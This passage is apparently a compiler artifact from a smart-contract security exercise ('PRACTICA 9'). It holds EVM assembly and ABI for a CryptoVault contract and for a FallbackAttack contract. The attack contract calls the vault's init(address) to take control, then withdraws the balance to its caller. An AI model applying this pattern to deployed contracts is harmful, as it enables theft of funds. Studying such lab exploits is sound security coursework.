											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 19,
											"end": 20,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "EQ",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "47"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 67,
											"end": 71,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 61,
											"end": 72,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 134,
											"end": 138,
											"name": "PUSH",
											"source": -1,
											"value": "1F"
										},
										{
											"begin": 130,
											"end": 139,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 123,
											"end": 127,
											"name": "PUSH",
											"source": -1,
											"value": "3F"
										},
										{
											"begin": 105,
											"end": 121,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 101,
											"end": 128,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 97,
											"end": 140,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 94,
											"end": 95,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 141,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 88,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 77,
											"end": 142,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 157,
											"end": 173,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 154,
											"end": 155,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 147,
											"end": 174,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 211,
											"end": 227,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 208,
											"end": 209,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 201,
											"end": 205,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 194,
											"end": 206,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 179,
											"end": 228,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "46"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "tag",
											"source": -1,
											"value": "47"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 32,
											"end": 36,
											"name": "PUSH",
											"source": -1,
											"value": "60"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 36,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "tag",
											"source": -1,
											"value": "46"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3548,
											"end": 3598,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3548,
											"end": 3598,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3548,
											"end": 3598,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3617,
											"end": 3621,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "48"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH",
											"source": 0,
											"value": "4661696C656420746F2073656E642066756E6473000000000000000000000000"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "tag",
											"source": 0,
											"value": "48"
										},
										{
											"begin": 3609,
											"end": 3646,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 741,
											"end": 761,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 741,
											"end": 761,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "tag",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 868,
											"end": 893,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 868,
											"end": 893,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 3136,
											"end": 3291,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 3136,
											"end": 3291,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3194,
											"end": 3201,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3226,
											"end": 3227,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3221,
											"end": 3222,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3221,
											"end": 3227,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 3221,
											"end": 3227,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH",
											"source": 1,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH",
											"source": 1,
											"value": "1E"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH",
											"source": 1,
											"value": "536166654D6174683A207375627472616374696F6E206F766572666C6F770000"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "tag",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 3213,
											"end": 3262,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3283,
											"end": 3284,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3279,
											"end": 3280,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3279,
											"end": 3284,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3272,
											"end": 3284,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3272,
											"end": 3284,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3136,
											"end": 3291,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 3136,
											"end": 3291,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3136,
											"end": 3291,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3136,
											"end": 3291,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3136,
											"end": 3291,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"accounts(address)": "5e5c06e2",
							"collectedFees()": "9003adfe",
							"deposit()": "d0e30db0",
							"owner()": "8da5cb5b",
							"withdraw(uint256)": "2e1a7d4d",
							"withdrawAll()": "853828b6"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.4+commit.1dca32f3\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_prcFee\",\"type\":\"uint8\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"accounts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"collectedFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"PRACTICA 9/CryptoVault2.sol\":\"CryptoVault\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"PRACTICA 9/CryptoVault2.sol\":{\"keccak256\":\"0xd47d0ccc73f25845eb52593e0e02f343d9ae0bdc04f9aeaac9d3895fd5cf5c65\",\"urls\":[\"bzz-raw://63d1cc1997da08857ae0a87ee61e0079573419566f3653b55f3e1014c9da055a\",\"dweb:/ipfs/QmTa6eRzByangAxzcA4PksJHpRdZsnD8HdMk1jin5rdH2o\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 4,
								"contract": "PRACTICA 9/CryptoVault2.sol:CryptoVault",
								"label": "owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 9,
								"contract": "PRACTICA 9/CryptoVault2.sol:CryptoVault",
								"label": "collectedFees",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 11,
								"contract": "PRACTICA 9/CryptoVault2.sol:CryptoVault",
								"label": "prcFee",
								"offset": 0,
								"slot": "2",
								"type": "t_uint8"
							},
							{
								"astId": 15,
								"contract": "PRACTICA 9/CryptoVault2.sol:CryptoVault",
								"label": "accounts",
								"offset": 0,
								"slot": "3",
								"type": "t_mapping(t_address,t_uint256)"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							},
							"t_uint8": {
								"encoding": "inplace",
								"label": "uint8",
								"numberOfBytes": "1"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"FallbackAttack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "at_contract",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "withdrawFunds",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"PRACTICA 9/CryptoVault2.sol\":6925:7809  contract FallbackAttack{\r... */\n  mstore(0x40, 0x80)\n    /* \"PRACTICA 9/CryptoVault2.sol\":7052:7174  constructor(address at_contract) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"PRACTICA 9/CryptoVault2.sol\":7052:7174  constructor(address at_contract) public {\r... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x20\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"PRACTICA 9/CryptoVault2.sol\":7052:7174  constructor(address at_contract) public {\r... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":7122:7133  at_contract */\n  dup1\n    /* \"PRACTICA 9/CryptoVault2.sol\":7103:7119  attackedContract */\n  0x00\n  dup1\n    /* \"PRACTICA 9/CryptoVault2.sol\":7103:7133  attackedContract = at_contract */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":7052:7174  constructor(address at_contract) public {\r... */\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":6925:7809  contract FallbackAttack{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"PRACTICA 9/CryptoVault2.sol\":6925:7809  contract FallbackAttack{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x24600fc3\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"PRACTICA 9/CryptoVault2.sol\":7636:7731  function withdrawFunds() external {\r... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_7\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_7:\n        /* \"PRACTICA 9/CryptoVault2.sol\":7636:7731  function withdrawFunds() external {\r... */\n      pop\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7184:7520  function attack() external{\r... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_10:\n        /* \"PRACTICA 9/CryptoVault2.sol\":7184:7520  function attack() external{\r... */\n      pop\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7636:7731  function withdrawFunds() external {\r... */\n    tag_9:\n        /* \"PRACTICA 9/CryptoVault2.sol\":7681:7691  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":7681:7700  msg.sender.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":7681:7723  msg.sender.transfer(address(this).balance) */\n      0x08fc\n        /* \"PRACTICA 9/CryptoVault2.sol\":7701:7722  address(this).balance */\n      selfbalance\n        /* \"PRACTICA 9/CryptoVault2.sol\":7681:7723  msg.sender.transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_15:\n        /* \"PRACTICA 9/CryptoVault2.sol\":7681:7723  msg.sender.transfer(address(this).balance) */\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":7636:7731  function withdrawFunds() external {\r... */\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":7184:7520  function attack() external{\r... */\n    tag_12:\n        /* \"PRACTICA 9/CryptoVault2.sol\":7314:7330  attackedContract */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":7314:7335  attackedContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":7385:7389  this */\n      address\n        /* \"PRACTICA 9/CryptoVault2.sol\":7336:7391  abi.encodeWithSignature(\"init(address)\", address(this)) */\n      add(0x24, mload(0x40))\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"PRACTICA 9/CryptoVault2.sol\":7336:7391  abi.encodeWithSignature(\"init(address)\", address(this)) */\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x19ab453c00000000000000000000000000000000000000000000000000000000)\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* 